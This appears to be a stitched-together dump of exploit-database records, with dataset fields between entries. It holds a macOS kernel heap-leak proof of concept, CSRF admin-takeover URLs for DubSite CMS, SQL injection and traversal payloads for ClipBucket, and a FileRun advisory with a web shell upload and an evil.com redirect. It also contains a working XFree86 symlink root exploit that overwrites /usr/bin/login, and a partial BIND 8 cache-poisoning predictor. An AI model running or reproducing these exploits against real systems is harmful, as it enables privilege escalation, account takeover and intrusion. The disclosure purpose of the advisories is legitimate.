to the kernel.  At (a) this is cast to a struct netagent and at (b) it's checked whether the payload is big enough to contain this structure. Then at (c) an int read from the buffer is compared against a lower and upper bound and then used at (d) as the size of data to copy from inside the payload buffer. It's not checked that the payload buffer is actually big enough to contain data_size bytes of data though.  This oob data can then be retreived by userspace via the SIOCGIFAGENTDATA64 ioctl. This poc will dump 4k of kernel heap.  Tested on MacOS 10.12.3 (16D32) on MacBookPro10,1 #endif #include <errno.h> #include <unistd.h> #include <netinet/in.h> #include <sys/socket.h> #include <sys/kern_control.h> #include <sys/sys_domain.h> #include <net/if.h> #include <netinet/in_var.h> #include <netinet6/nd6.h> #include <arpa/inet.h> #include <sys/ioctl.h>  #include <stdio.h> #include <stdlib.h> #include <string.h>  int ctl_open(char* control_name) {   int           sock;   int           error     = 0;   struct ctl_info     kernctl_info;   struct sockaddr_ctl   kernctl_addr;    sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);   if (sock < 0) {     printf(""failed to open a SYSPROTO_CONTROL socket: %s\n"", strerror(errno));     goto done;   }    memset(&kernctl_info, 0, sizeof(kernctl_info));   strlcpy(kernctl_info.ctl_name, control_name, sizeof(kernctl_info.ctl_name));    error = ioctl(sock, CTLIOCGINFO, &kernctl_info);   if (error) {     printf(""Failed to get the control info for control named \""%s\"": %s\n"", control_name, strerror(errno));     goto done;   }    memset(&kernctl_addr, 0, sizeof(kernctl_addr));   kernctl_addr.sc_len = sizeof(kernctl_addr);   kernctl_addr.sc_family = AF_SYSTEM;   kernctl_addr.ss_sysaddr = AF_SYS_CONTROL;   kernctl_addr.sc_id = kernctl_info.ctl_id;   kernctl_addr.sc_unit = 0;    error = connect(sock, (struct sockaddr *)&kernctl_addr, sizeof(kernctl_addr));   if (error) {     printf(""Failed to connect to the control socket: %s\n"", strerror(errno));     goto done;   }  done:   if (error && sock >= 0) {     close(sock);     sock = -1;   }    return sock; }  #define NETAGENT_OPTION_TYPE_REGISTER 1 #define NETAGENT_DOMAINSIZE   32 #define NETAGENT_TYPESIZE   32 #define NETAGENT_DESCSIZE   128  struct netagent_req64 { 	uuid_t		netagent_uuid; 	char		netagent_domain[NETAGENT_DOMAINSIZE]; 	char		netagent_type[NETAGENT_TYPESIZE]; 	char		netagent_desc[NETAGENT_DESCSIZE]; 	u_int32_t	netagent_flags; 	u_int32_t	netagent_data_size; 	uint64_t	netagent_data __attribute__((aligned(8))); };  struct netagent { 	uuid_t		netagent_uuid; 	char		netagent_domain[NETAGENT_DOMAINSIZE]; 	char		netagent_type[NETAGENT_TYPESIZE]; 	char		netagent_desc[NETAGENT_DESCSIZE]; 	u_int32_t	netagent_flags; 	u_int32_t	netagent_data_size; 	u_int8_t	netagent_data[0]; };  #define SIOCGIFAGENTDATA64    _IOWR('i', 168, struct netagent_req64)  int main(){   int fd = ctl_open(""com.apple.net.netagent"");   if (fd < 0) {     printf(""failed to get control socket :(\n"");     return 1;   }   printf(""got a control socket! %d\n"", fd);    struct netagent na = {0};   na.netagent_uuid[0] = 123;   na.netagent_data_size = 4096;    int err = setsockopt(fd,                        SYSPROTO_CONTROL,                        NETAGENT_OPTION_TYPE_REGISTER,                        &na,                        sizeof(na));   if (err == -1) {     perror(""setsockopt failed"");     return 0;   } else {     printf(""set the option!\n"");   }    uint64_t* buf = malloc(4096);   memset(buf, 0, 4096);    struct netagent_req64 req = {0};   req.netagent_uuid[0] = 123;   req.netagent_data_size = 4096;   req.netagent_data = (uint64_t)buf;     err = ioctl(fd, SIOCGIFAGENTDATA64, &req);   if (err == -1) {     perror(""get getinterface agent data failed"");   }else {     printf(""got something?\n"");     for (int i = 0; i < 4096/8; i++) {       printf(""%016llx\n"", buf[i]);     }   }       return 0; }",Apple,1
10462,"DubSite CMS 1.0 - Cross-Site Request Forgery Pentest Information: ==================== Connection has discovered a Cross Site Request Forgery(CSRF) vulnerability in DubSite CMS v1.0   Details ======= Tested on OS:		Windows XP Tested with Software:	Mozilla Firefox 3.5.x  Vulnerable Products: 	DubSite CMS Affected Versions:	1.0 	 Vulnerability Type:	Cross Site Request Forgery Security-Risk: 		High  Vendor-URL: 		http://www.dubsite.net Preview-URL:		http://www.opensourcecms.com/demo/1/282/Dubsite  Vendor-Status: 		Not informed Patch/Fix-Status:	Fixed version not released Advisory-Status:	Written | 12/15/09  Advisory-URL: 		 Report-URL:		   Introduction: ============= Dubsite CMS is a minimalistic yet powerful approach to web content management. Dubsite is written in PHP, built upon the Zend Framework and published under the GNU General Public License. It's goal is to simplify effective management and handling of websites without being overbearing to non-technical users.  (Copy from the vendors homepage: http://www.dubsite.net)  More Details: ============= Due to the lack of multiple input validation errors, an attacker is able to change the password of the administrative user  Proof of Concept: ================= The following link will change the password of the administrative account. Changing the options will also allow you to change the name of the admin account:  http://server/dubsite/index.php/admin/users/accounts/edit/1?username=admin&userpassword=own3d&userpassword2=own3d&role_id=1&active=1&update=Update  This link creates a user ""hax0r"" with password test123 and adds it to the administrator group.  http://server/dubsite/index.php/admin/users/accounts?role_id=1&username=hax0r&userpassword=test123&userpassword2=test123&create=Create  Fix & Patch: ============ To fix the bugs a token system is highly advised  Security Risk: ============== An attacker is able to change the password of the administrative user thus having complete control over the site. The risk is estimated as HIGH  Author: ======= The Author & Writer is a Part of the HackTalk Security Group.  ~CONNECTION",.dubsite.,1
42457,"ClipBucket 2.8.3 - Multiple Vulnerabilities @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ .:. Exploit Title > ClipBucket 2.8.3 - Multiple Vulnerabilities  .:. Google Dorks .:. ""Forged by ClipBucket"" inurl:view_collection.php?cid=  .:. Date: August 15, 2017  .:. Exploit Author: bRpsd .:. Skype contact: vegnox .:. Mail contact: cy@live.no  .:. Vendor Homepage > https://clipbucket.com/latest .:. Software Link > https://github.com/arslancb/clipbucket/archive/4829.zip .:. Version: 2.8.3 latest! .:. Tested on > Linux, on local xampp @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    Vulnerability 1: Blind SQL Injection  Type: boolean File: /view_collection.php Parameter: cid   .:. POC .:.  http://localhost/view_collection.php?cid=-1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--&type=photos [columns count] http://localhost/view_collection.php?cid=1 AND 1=1&type=photos [true] http://localhost/view_collection.php?cid=1 AND 1=2&type=photos [false]      Vulnerability 2: Arbitrary File Read/Write  NOTE: Access Requires Admin Privilege!  File: /admin_area/template_editor.php Parameter: file  .:. POC .:.  The template editor is suppose to allow editing html/css files only, but if you modify the file parameter you can escape the template directory then view OR edit any file actually of any extension.  http://localhost/admin_area/template_editor.php?dir=cb_28&file=../../../index.php&folder=layout      Vulnerability 3: Default & Weak admin password  When you setup the CMS, the admin password is autocomplete set as [admin] unless you change it, lazy people will skip changing that field and end up having username and password as 'admin' which is pretty easy to guess!       -Be safe.",clipbucket_project,1
43015,"Afian AB FileRun 2017.03.18 - Multiple Vulnerabilities SEC Consult Vulnerability Lab Security Advisory < 20171018-0 > =======================================================================               title: Multiple vulnerabilities             product: Afian AB FileRun  vulnerable version: 2017.03.18       fixed version: 2017.09.18              impact: critical            homepage: https://www.filerun.com | https://afian.se               found: 2017-08-28                  by: Roman Ferdigg (Office Vienna)                      SEC Consult Vulnerability Lab                       An integrated part of SEC Consult                      Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow                      Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich                       https://www.sec-consult.com  =======================================================================  Vendor description: ------------------- ""FileRun File Manager: access your files anywhere through self-hosted secure cloud storage, file backup and sharing for your photos, videos, files and more. Upload and download large files for easy sharing. Google Drive self-hosted alternative.""  Source: https://www.filerun.com   Business recommendation: ------------------------ By exploiting the vulnerabilities documented in this advisory, an attacker can compromise the web server which has FileRun installed. User files might get exposed through this attack.  SEC Consult recommends not to use FileRun until a thorough security review has been performed by security professionals and all identified issues have been resolved.   Vulnerability overview/description: ----------------------------------- 1) Path Manipulation When uploading, downloading or viewing files, FileRun uses a parameter to specify the path on the file-system. An attacker can manipulate the value of this parameter to read, create and even overwrite files in certain folders. An attacker could upload malicious files to compromise the webserver. In combination with the open redirect and CSRF vulnerability even an unauthenticated attacker can upload these files to get a shell. Through the shell all user files can be accessed.   2) Stored Cross Site Scripting (XSS) via File Upload The application allows users to upload different file types. It is also possible to upload HTML files or to create them via the application's text editor. Files can be shared using a link or within the FileRun application (in the enterprise version). An attacker can inject JavaScript in HTML files to attack other users or simply create a phishing site to steal user credentials.  Remark: In the standard configuration of the FileRun docker image the HttpOnly cookie flag is not set, which means that authentication cookies can be accessed in an XSS attack. This allows easy session hijacking as well.   3) Cross Site Request Forgery (CSRF) The application does not implement CSRF protection. An attacker can exploit this vulnerability to execute arbitrary requests with the privileges of the victim. The only requirement is that a victim visits a malicious webpage. Such a page could be hosted on the FileRun server itself and shared with other users as described in vulnerability 2. Besides others, the following actions can be performed via CSRF if the victim has administrative privileges:  - Create or delete users  - Change permissions rights of users  - Change user passwords  If the victim has no administrative privileges, for example the following actions can be performed:  - Upload files  - Change the email address (for password recovery)   4) Open Redirect Vulnerabilities An open redirect vulnerability in the login and logout pages allows an attacker to redirect users to arbitrary web sites. The redirection host could be used for phishing attacks (e.g. to steal user credentials) or for running browser exploits to infect a victim's machine with malware. The open redirect in the login page could also be used to exploit CSRF (see above). Because the server name in the manipulated link is identical to the original site, phishing attempts may have a more trustworthy appearance.   Proof of concept: ----------------- 1) Path Manipulation The URL below is used to read the application file ""autoconfig.php"", which contains the username and cleartext password of the database.  URL: http://$DOMAIN/?module=custom_actions&action=open_in_browser&path=/var/www/html/system/data/autoconfig.php   This post request is used to upload a PHP shell in the writable folder avatars:  POST /?module=fileman_myfiles&section=ajax&page=up HTTP/1.1 Host: $DOMAIN [...] Content-Type: multipart/form-data; boundary=---------------------------293712729522107 Cookie: FileRunSID=t5h7lm99r1ff0quhsajcudh7t0; language=english DNT: 1 Connection: close  -----------------------------293712729522107 Content-Disposition: form-data; name=""flowTotalSize""  150 -----------------------------293712729522107 Content-Disposition: form-data; name=""flowIsFirstChunk""  1 -----------------------------293712729522107 Content-Disposition: form-data; name=""flowIsLastChunk""  1 -----------------------------293712729522107 Content-Disposition: form-data; name=""flowFilename""  shell.php -----------------------------293712729522107 Content-Disposition: form-data; name=""path""  /var/www/html/system/data/avatars/ -----------------------------293712729522107 Content-Disposition: form-data; name=""file""; filename=""shell.php"" Content-Type: application/octet-stream  *web shell payload here*  -----------------------------293712729522107--  To execute the uploaded shell a .htaccess file with the contents below can be uploaded in the same folder.  Content of .htaccess file: <Files  ""*"">  Order allow,deny  Allow from all </Files>  The uploaded shell can be accessed by the following URL: http://$DOMAIN/?module=custom_actions&action=open_in_browser&path=/var/www/html/system/data/avatars/shell.php  2) Stored Cross Site Scripting (XSS) via File Upload An HTML file with JavaScript code can be easily uploaded to attack other users. No PoC necessary.  3) Cross Site Request Forgery An example for a CSRF attack would be the following request which changes the email address of the victim:  <html>   <body>     <form action=""http://$DOMAIN/?module=fileman&section=profile&action=save"" method=""POST"">       <input type=""hidden"" name=""receive_notifications"" value=""0"" />       <input type=""hidden"" name=""two_step_enabled"" value=""0"" />       <input type=""hidden"" name=""name"" value=""User"" />       <input type=""hidden"" name=""name2"" value=""A"" />       <input type=""hidden"" name=""email"" value=""newemail@example.com"" />       <input type=""hidden"" name=""ext-comp-1009"" value=""on"" />       <input type=""hidden"" name=""current_password"" value="""" />       <input type=""hidden"" name=""new_password"" value="""" />       <input type=""hidden"" name=""confirm_new_password"" value="""" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>  The new email address can be used by the attacker to reset the password of the victim.   4) Open Redirect Vulnerabilites The URL below can be used to forward a user to an arbitrary website after the login: http://$DOMAIN/?redirectAfterLogin=aHR0cDovL3d3dy5ldmlsLmNvbQ==  The value of the redirect parameter needs to be base64 encoded.  To redirect a user after logout, following URL can be used: http://$DOMAIN/?module=fileman&page=logout&redirect=http://evil.com  In this case for a successful exploit, the victim has to be logged in.   Vulnerable / tested versions: ----------------------------- The regular version of FileRun 2017.03.18 has been tested. It is assumed earlier versions of FileRun are also vulnerable to the issues.   Vendor contact timeline: ------------------------ 2017-08-31: Contacting vendor through info@afian.se, info@filerun.com 2017-09-01: Sending unencrypted advisory as requested by vendor 2017-09-04: FileRun fixed the vulnerability ""Path Manipulation"" 2017-09-12: Requesting a status update 2017-09-13: FileRun informed us that a patch for all vulnerabilities will             be released before 2017-09-20 2017-09-16: Patch available 2017-10-18: Public release of security advisory   Solution: --------- Update to the latest version available (see https://docs.filerun.com/updating). According to FileRun, all the vulnerabilities are fixed in release 2017.09.18 or higher.  For further information see: https://www.filerun.com/changelog   Workaround: ----------- No workaround available.   Advisory URL: ------------- https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  SEC Consult Vulnerability Lab  SEC Consult Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich  About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Interested to work with the experts of SEC Consult? Send us your application https://sec-consult.com/en/career/index.html  Interested in improving your cyber security with the experts of SEC Consult? Contact our local offices https://sec-consult.com/en/contact/index.html ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult  EOF Roman Ferdigg / @2017",.file,0
19257,"X11R6 3.3.3 - Symlink // source: https://www.securityfocus.com/bid/326/info  There is a symlink vulnerability known to exist under most modern linux and NetBSD distributions. It involves /tmp/.X11-unix and the tendency to follow to/overwrite the file pointed to if a symlink. It may be possible for a regular user to write arbritrary data to a file they normally have no write access to resulting in a root compromise.   /*** local XFree 3.3.3-symlink  root-compromise.  *** Tested under FreeBSD 3.1 (but should work on others 2)  *** (C) 1999/2000 by Stealthf0rk for the K.A.L.U.G.   *** (check out http://www.kalug.lug.net/stealth or /coding for  ***  other kewl stuff!)  ***  *** FOR EDUCATIONAL PURPOSES ONLY!!! USE IT AT YOUR OWN RISK.  *** Even if this program restores all, you should backup your  *** login before running this.  ***/  #include <stdio.h> #include <unistd.h> #include <errno.h> #include <fcntl.h>  #define LOGIN ""/usr/bin/login"" #define TELNET ""/usr/bin/telnet""  int cp(const char*, const char*, int);  int main(int argc, char **argv) {  	char *telnet[] = {TELNET, ""localhost"", NULL}; 	char *shell[] = {""/bin/sh"", NULL}; 	char *X[] = {""/usr/X11R6/bin/xinit"", NULL}; 	FILE *f = NULL; 	int p = 0; 	char buf[1000] = {0};  	/* the rootshell */ 	if (!geteuid() || !getuid()) { 		unlink(LOGIN); 		cp(""/tmp/L"", LOGIN, 1); 		chmod(LOGIN, 04555); 		printf(""Welcome!\n""); 		unlink(""/tmp/.X11-unix""); 		unlink(""/tmp/L""); 		execve(*shell, shell, NULL); 	} 	 	/* back up */ 	cp(LOGIN, ""/tmp/L"", 1); 	if (symlink(LOGIN, ""/tmp/.X11-unix"") < 0) { 		perror(""symlink (/tmp/.X11-unix)""); 		exit(errno); 	} 	if ((p = fork()) < 0) { 		perror(""fork""); 		exit(errno); 	} else if (p > 0) { 		sleep(7); 		kill(p, 9); 		cp(argv[0], LOGIN, 1); 		execve(telnet[0], telnet, NULL); 		perror(""fatal:""); 	} else { 		printf(""Xfree 3.3.3 root-sploit by Stealth. http://www.kalug.lug.net\n""); 		printf(""\n-> Please give me some seconds... <-\n\n""); 		execve(X[0], X, NULL); 	} 	return 0; } 	 	 int cp(const char *from, const char *to, int how) { 	int in = 0, out = 0, r = 0; 	char buf[1000] = {0}; 	  	printf(""cp %s %s\n"", from, to); 	/* overwrite ? */ 	if (how == 1)  		how = O_RDWR|O_TRUNC|O_CREAT; 	else 		how = O_RDWR|O_CREAT;          if ((out = open(to, how)) < 0) { 		perror(""open 1""); 		exit(errno); 	} 	if ((in = open(from, O_RDONLY)) < 0) { 		perror(""open 2""); 		exit(errno); 	} 	while ((r = read(in, buf, 1000-1)) > 0) { 		write(out,buf,r); 		memset(buf,0,1000); 	} 	close(in); close(out); 	return 0; }",cambiumnetworks,1
30535,"ISC BIND 8 - Remote Cache Poisoning (1) #source: https://www.securityfocus.com/bid/25459/info # #BIND 8 is prone to a remote cache-poisoning vulnerability because of weaknesses in its random-number generator. # #An attacker may leverage this issue to manipulate cache data, potentially facilitating man-in-the-middle, site-impersonation, or denial-of-service attacks. # #Versions of BIND from 8.2.0 through to 8.4.7 are vulnerable to this issue.  #  # Window of guessing  # (linear impact on runtime, but also improves success rate) $WINDOW_SIZE=500;  # How many predictions will be generated per (a,z) candidate # (actually twice that number) $PREDICT_SIZE=500;   use Time::HiRes qw(gettimeofday);  # This table is copied as is from the BIND 8.4.7 source code # (file ./src/bin/named/ns_main.c) my @nsid_multiplier_table = ( 	17565, 25013, 11733, 19877, 23989, 23997, 24997, 25421, 	26781, 27413, 35901, 35917, 35973, 36229, 38317, 38437, 	39941, 40493, 41853, 46317, 50581, 51429, 53453, 53805, 	11317, 11789, 12045, 12413, 14277, 14821, 14917, 18989, 	19821, 23005, 23533, 23573, 23693, 27549, 27709, 28461, 	29365, 35605, 37693, 37757, 38309, 41285, 45261, 47061, 	47269, 48133, 48597, 50277, 50717, 50757, 50805, 51341, 	51413, 51581, 51597, 53445, 11493, 14229, 20365, 20653, 	23485, 25541, 27429, 29421, 30173, 35445, 35653, 36789, 	36797, 37109, 37157, 37669, 38661, 39773, 40397, 41837, 	41877, 45293, 47277, 47845, 49853, 51085, 51349, 54085, 	56933,  8877,  8973,  9885, 11365, 11813, 13581, 13589, 	13613, 14109, 14317, 15765, 15789, 16925, 17069, 17205, 	17621, 17941, 19077, 19381, 20245, 22845, 23733, 24869, 	25453, 27213, 28381, 28965, 29245, 29997, 30733, 30901, 	34877, 35485, 35613, 36133, 36661, 36917, 38597, 40285, 	40693, 41413, 41541, 41637, 42053, 42349, 45245, 45469, 	46493, 48205, 48613, 50861, 51861, 52877, 53933, 54397, 	55669, 56453, 56965, 58021,  7757,  7781,  8333,  9661, 	12229, 14373, 14453, 17549, 18141, 19085, 20773, 23701, 	24205, 24333, 25261, 25317, 27181, 30117, 30477, 34757, 	34885, 35565, 35885, 36541, 37957, 39733, 39813, 41157, 	41893, 42317, 46621, 48117, 48181, 49525, 55261, 55389, 	56845,  7045,  7749,  7965,  8469,  9133,  9549,  9789, 	10173, 11181, 11285, 12253, 13453, 13533, 13757, 14477, 	15053, 16901, 17213, 17269, 17525, 17629, 18605, 19013, 	19829, 19933, 20069, 20093, 23261, 23333, 24949, 25309, 	27613, 28453, 28709, 29301, 29541, 34165, 34413, 37301, 	37773, 38045, 38405, 41077, 41781, 41925, 42717, 44437, 	44525, 44613, 45933, 45941, 47077, 50077, 50893, 52117, 	 5293, 55069, 55989, 58125, 59205,  6869, 14685, 15453, 	16821, 17045, 17613, 18437, 21029, 22773, 22909, 25445, 	25757, 26541, 30709, 30909, 31093, 31149, 37069, 37725, 	37925, 38949, 39637, 39701, 40765, 40861, 42965, 44813, 	45077, 45733, 47045, 50093, 52861, 52957, 54181, 56325, 	56365, 56381, 56877, 57013,  5741, 58101, 58669,  8613, 	10045, 10261, 10653, 10733, 11461, 12261, 14069, 15877, 	17757, 21165, 23885, 24701, 26429, 26645, 27925, 28765, 	29197, 30189, 31293, 39781, 39909, 40365, 41229, 41453, 	41653, 42165, 42365, 47421, 48029, 48085, 52773,  5573, 	57037, 57637, 58341, 58357, 58901,  6357,  7789,  9093, 	10125, 10709, 10765, 11957, 12469, 13437, 13509, 14773, 	15437, 15773, 17813, 18829, 19565, 20237, 23461, 23685, 	23725, 23941, 24877, 25461, 26405, 29509, 30285, 35181, 	37229, 37893, 38565, 40293, 44189, 44581, 45701, 47381, 	47589, 48557,  4941, 51069,  5165, 52797, 53149,  5341, 	56301, 56765, 58581, 59493, 59677,  6085,  6349,  8293, 	 8501,  8517, 11597, 11709, 12589, 12693, 13517, 14909, 	17397, 18085, 21101, 21269, 22717, 25237, 25661, 29189, 	30101, 31397, 33933, 34213, 34661, 35533, 36493, 37309, 	40037,  4189, 42909, 44309, 44357, 44389,  4541, 45461, 	46445, 48237, 54149, 55301, 55853, 56621, 56717, 56901, 	 5813, 58437, 12493, 15365, 15989, 17829, 18229, 19341, 	21013, 21357, 22925, 24885, 26053, 27581, 28221, 28485, 	30605, 30613, 30789, 35437, 36285, 37189,  3941, 41797, 	 4269, 42901, 43293, 44645, 45221, 46893,  4893, 50301, 	50325,  5189, 52109, 53517, 54053, 54485,  5525, 55949, 	56973, 59069, 59421, 60733, 61253,  6421,  6701,  6709, 	 7101,  8669, 15797, 19221, 19837, 20133, 20957, 21293, 	21461, 22461, 29085, 29861, 30869, 34973, 36469, 37565, 	38125, 38829, 39469, 40061, 40117, 44093, 47429, 48341, 	50597, 51757,  5541, 57629, 58405, 59621, 59693, 59701, 	61837,  7061, 10421, 11949, 15405, 20861, 25397, 25509, 	25893, 26037, 28629, 28869, 29605, 30213, 34205, 35637, 	36365, 37285,  3773, 39117,  4021, 41061, 42653, 44509, 	 4461, 44829,  4725,  5125, 52269, 56469, 59085,  5917, 	60973,  8349, 17725, 18637, 19773, 20293, 21453, 22533, 	24285, 26333, 26997, 31501, 34541, 34805, 37509, 38477, 	41333, 44125, 46285, 46997, 47637, 48173,  4925, 50253, 	50381, 50917, 51205, 51325, 52165, 52229,  5253,  5269, 	53509, 56253, 56341,  5821, 58373, 60301, 61653, 61973, 	62373,  8397, 11981, 14341, 14509, 15077, 22261, 22429, 	24261, 28165, 28685, 30661, 34021, 34445, 39149,  3917, 	43013, 43317, 44053, 44101,  4533, 49541, 49981,  5277, 	54477, 56357, 57261, 57765, 58573, 59061, 60197, 61197, 	62189,  7725,  8477,  9565, 10229, 11437, 14613, 14709, 	16813, 20029, 20677, 31445,  3165, 31957,  3229, 33541, 	36645,  3805, 38973,  3965,  4029, 44293, 44557, 46245, 	48917,  4909, 51749, 53709, 55733, 56445,  5925,  6093, 	61053, 62637,  8661,  9109, 10821, 11389, 13813, 14325, 	15501, 16149, 18845, 22669, 26437, 29869, 31837, 33709, 	33973, 34173,  3677,  3877,  3981, 39885, 42117,  4421, 	44221, 44245, 44693, 46157, 47309,  5005, 51461, 52037, 	55333, 55693, 56277, 58949,  6205, 62141, 62469,  6293, 	10101, 12509, 14029, 17997, 20469, 21149, 25221, 27109, 	 2773,  2877, 29405, 31493, 31645,  4077, 42005, 42077, 	42469, 42501, 44013, 48653, 49349,  4997, 50101, 55405, 	56957, 58037, 59429, 60749, 61797, 62381, 62837,  6605, 	10541, 23981, 24533,  2701, 27333, 27341, 31197, 33805, 	 3621, 37381,  3749,  3829, 38533, 42613, 44381, 45901, 	48517, 51269, 57725, 59461, 60045, 62029, 13805, 14013, 	15461, 16069, 16157, 18573,  2309, 23501, 28645,  3077, 	31541, 36357, 36877,  3789, 39429, 39805, 47685, 47949, 	49413,  5485, 56757, 57549, 57805, 58317, 59549, 62213, 	62613, 62853, 62933,  8909, 12941, 16677, 20333, 21541, 	24429, 26077, 26421,  2885, 31269, 33381,  3661, 40925, 	42925, 45173,  4525,  4709, 53133, 55941, 57413, 57797, 	62125, 62237, 62733,  6773, 12317, 13197, 16533, 16933, 	18245,  2213,  2477, 29757, 33293, 35517, 40133, 40749, 	 4661, 49941, 62757,  7853,  8149,  8573, 11029, 13421, 	21549, 22709, 22725, 24629,  2469, 26125,  2669, 34253, 	36709, 41013, 45597, 46637, 52285, 52333, 54685, 59013, 	60997, 61189, 61981, 62605, 62821,  7077,  7525,  8781, 	10861, 15277,  2205, 22077, 28517, 28949, 32109, 33493, 	 3685, 39197, 39869, 42621, 44997, 48565,  5221, 57381, 	61749, 62317, 63245, 63381, 23149,  2549, 28661, 31653, 	33885, 36341, 37053, 39517, 42805, 45853, 48997, 59349, 	60053, 62509, 63069,  6525,  1893, 20181,  2365, 24893, 	27397, 31357, 32277, 33357, 34437, 36677, 37661, 43469, 	43917, 50997, 53869,  5653, 13221, 16741, 17893,  2157, 	28653, 31789, 35301, 35821, 61613, 62245, 12405, 14517, 	17453, 18421,  3149,  3205, 40341,  4109, 43941, 46869, 	48837, 50621, 57405, 60509, 62877,  8157, 12933, 12957, 	16501, 19533,  3461, 36829, 52357, 58189, 58293, 63053, 	17109,  1933, 32157, 37701, 59005, 61621, 13029, 15085, 	16493, 32317, 35093,  5061, 51557, 62221, 20765, 24613, 	 2629, 30861, 33197, 33749, 35365, 37933, 40317, 48045, 	56229, 61157, 63797,  7917, 17965,  1917,  1973, 20301, 	 2253, 33157, 58629, 59861, 61085, 63909,  8141,  9221, 	14757,  1581, 21637, 26557, 33869, 34285, 35733, 40933, 	42517, 43501, 53653, 61885, 63805,  7141, 21653, 54973, 	31189, 60061, 60341, 63357, 16045,  2053, 26069, 33997, 	43901, 54565, 63837,  8949, 17909, 18693, 32349, 33125, 	37293, 48821, 49053, 51309, 64037,  7117,  1445, 20405, 	23085, 26269, 26293, 27349, 32381, 33141, 34525, 36461, 	37581, 43525,  4357, 43877,  5069, 55197, 63965,  9845, 	12093,  2197,  2229, 32165, 33469, 40981, 42397,  8749, 	10853,  1453, 18069, 21693, 30573, 36261, 37421, 42533 );   @res=@ARGV; $SIZE=scalar(@res);  if ($SIZE<5) { 	die ""Use command line arguments to specify 5+ consecutive TRXIDs""; }  sub invert { 	my $x=shift; 	$inv_x=1; 	for (my $b=1;$b<=16;$b++) 	{ 		if ((($x*$inv_x) % (1<<$b))!=1) 		{ 			$inv_x|=(1<<($b-1)); 		} 	} 	return $inv_x; }  @inv_tab=(); for (my $inv_maker=0;$inv_maker<0x8000;$inv_maker++) { 	push @inv_tab,0; 	push @inv_tab,invert($inv_maker*2+1); }  %a_to_index=();  for (my $i=0;$i<1024;$i++) { 	$a_to_index{$nsid_multiplier_table[$i]}=$i; }  sub add_to_temp_set { 	my $v1=shift; 	my $v2=shift; 	my $a=shift; 	my $len=shift; 	 	my $ap=1; 	my $sum=0; 	  	for (my $i=1;$i<$len;$i++) 	{ 		$sum=($sum+$ap) % 65536; 		$ap=($ap*$a) % 65536; 		my $c=($ap*$v1) % 65536; 		$c=($v2-$c) % 65536;  		for ($t=0;$t<16;$t++) 		{ 			if (($sum>>$t) & 1) 			{ 				last; 			} 		}  		if (($c & ((1<<$t)-1))) 		{ 			# equation has no solution since $c is  			# not divisible by 2^$t.  			next; 		} 		if ((($c>>$t) & 1) == 0) 		{ 			# $z will come out even. we know this is  			# not the right solution  			next; 		} 		 		my $inv_sum=$inv_tab[$sum>>$t];  		my $basis=($inv_sum*($c>>$t)) % 65536; 		for (my $k=0;$k<(1<<$t);$k++) 		{ 			$temp_set{(($k<<(16-$t))+$basis) % 65536}=1; 		} 	} }  %set=(); %temp_set=();  my %a_set=(); for (my $i=0;$i<1024;$i++) { 	my $a=$nsid_multiplier_table[$i]; 	if ($a_set{$inv_tab[$a]}) 	{ 		next; 	} 	$a_set{$a}=1; } @a_list=keys %a_set;   @good_a=(); @good_z=();  my $start_time=gettimeofday(); for (my $index=0;$index<1024/2;$index++) { 	$a=$a_list[$index];  	for (my $j=0;$j<($SIZE-1);$j++) 	{ 		my $v1=$res[$j]; 		my $v2=$res[$j+1];  		%temp_set=(); 		add_to_temp_set($v1,$v2,$a,$WINDOW_SIZE); 		add_to_temp_set($v2,$v1,$a,$WINDOW_SIZE);  		if ($j==0) 		{ 			%set=%temp_set; 		} 		else 		{ 			%new_set=(); 			foreach $key (keys %set) 			{ 				if ($temp_set{$key}) 				{ 					$new_set{$key}=1; 				} 			} 			%set=%new_set; 		} 		 		if (scalar(keys %set)==0) 		{ 			last; 		} 	} 	if (scalar(keys %set)>0) 	{ 		# Check a,z 		$cand_a=$a; 		$cand_z=(keys %set)[0];  		my $ok=1;  		if (not defined $a_to_index{$cand_a}) 		{ 			$ok=0; 		}  		my $a1ndx=$a_to_index{$cand_a}; 	 		if ((($cand_z>>1) & 3) != (($a1ndx>>3) & 3)) 		{ 			$ok=0; 		} 		 		if ($ok) 		{ 			push @good_a,$cand_a; 			push @good_z,$cand_z; 		}  		# Check inverse(a) and its corresponding z 		$cand_a=$inv_tab[$a]; 		$cand_z=(-$inv_tab[$a]*$cand_z) % 65536;  		$ok=1; 		if (not defined $a_to_index{$cand_a}) 		{ 			$ok=0; 		}  		$a1ndx=$a_to_index{$cand_a}; 	 		if ((($cand_z>>1) & 3) != (($a1ndx>>3) & 3)) 		{ 			$ok=0; 		} 		 		if ($ok) 		{ 			push @good_a,$cand_a; 			push @good_z,$cand_z; 		} 	} }  %pred=(); for (my $cand=0;$cand<scalar(@good_a);$cand++) { 	#Find optimal starting point 	my $pos=0; 	my $max_pos=0; 	my $best=$res[0]; 	for (my $p=1;$p<$SIZE;$p++) 	{ 		my $x=$res[$p-1]; 		my $k; 		